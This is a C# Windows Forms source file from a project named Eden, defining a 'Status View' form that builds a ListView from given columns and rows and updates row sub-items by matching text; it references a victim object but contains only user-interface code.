using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmListViewItem : Form
    {
        public clsVictim m_victim { get; init; }
        public string[] m_aCols { get; init; }
        public string[] m_aItemText { get; init; }

        public frmListViewItem(clsVictim victim, string[] asCols, string[] asItemText)
        {
            InitializeComponent();

            m_victim = victim;
            m_aCols = asCols;
            m_aItemText = asItemText;
            Text = "Status View";
        }

        public void UpdateStatus(string szText, params string[] aSubItemText)
        {
            Invoke(new Action(() =>
            {
                foreach (ListViewItem item in listView1.Items)
                {
                    if (item.Text == szText)
                    {
                        for (int i = 0; i < aSubItemText.Length; i++)
                        {
                            item.SubItems[i + 1].Text = aSubItemText[i];
                        }
                    }
                }
            }));
        }

        void setup()
        {
            listView1.View = View.Details;
            listView1.FullRowSelect = true;

            foreach (string szCol in m_aCols)
            {
                ColumnHeader header = new ColumnHeader();
                header.Text = szCol;
                header.Width = 120;

                listView1.Columns.Add(header);
            }

            foreach (string szItem in m_aItemText)
            {
                ListViewItem item = new ListViewItem(szItem);
                for (int i = 0; i < m_aCols.Length - 1; i++)
                    item.SubItems.Add(string.Empty);

                listView1.Items.Add(item);
            }
        }

        private void frmListViewItem_Load(object sender, EventArgs e)
        {
            setup();
        }
    }
}
